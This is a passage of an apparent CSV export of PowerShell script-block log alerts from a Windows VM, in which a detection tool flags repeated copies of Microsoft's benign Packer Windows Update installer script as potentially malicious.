$script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: 8c8bd0b7-27c8-4beb-9ba0-c8fee05dea35 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:12:30.727 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,37,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: c639b3e1-d0d6-4434-93dd-afeb739a1a00 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:20:27.605 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,41,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and 